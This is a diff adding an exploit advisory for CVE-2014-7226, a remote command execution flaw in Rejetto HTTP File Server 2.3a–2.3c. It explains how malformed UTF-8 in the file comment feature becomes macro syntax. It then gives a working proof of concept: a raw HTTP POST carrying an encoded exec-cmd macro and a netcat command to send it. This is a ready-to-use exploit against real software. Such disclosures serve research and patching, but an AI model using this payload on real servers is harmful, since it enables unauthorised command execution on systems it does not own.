@@ -1,0 +1,44 @@
+==========================================================
+HTTP File Server 2.3a - 2.3b - 2.3c Remote Command Execution
+
+# Author : Daniele Linguaglossa
+# Date: 30/09/2014
+# Remote: Yes
+# Vendor Homepage: http://rejetto.com/
+# Software Link: http://downloads.sourceforge.net/hfs/hfs2.3c.src.zip
+# CVE: CVE-2014-7226
+# Vendor Hompage: http://www.rejetto.com
+# Tested on: Windows 8
+# Version: 2.3a - 2.3b - 2.3c
+
+The latest HTTP File Server (2.3c and maybe prior too) was found to be
+vulnerable to a remote command execution in the file comment features ,
+because the application did not properly validate uft-8 broken byte
+representation, in fact during parsing program won't notice that there are
+multiple invalid representation and when they are printed into the page
+will get replaced with one of these characters " { . | } "  causing a macro
+to be executed.
+==========================================================
+PoC
+==========================================================
+bug-utf8.txt
+==========================================================
+POST /upload/?mode=section&id=ajax.comment HTTP/1.1
+Connection: Close
+Content-Type:application/x-www-form-urlencoded
+
+text=%c1%bb%c0%aeexec%c1%bccmd%c0%ae%c1%bd&files=x
+==========================================================
+
+Copy the following on a file called bug-utf8.txt , then open hfs and add a
+folder called upload,
+it will ask if anyone should have upload permission click yes then with
+netcat do the following:
+
+nc localhost 8080 < bug-utf8.txt
+
+if everything was fine you should see a new command prompt being executed
+from hfs.
+
+==========================================================
+EOF
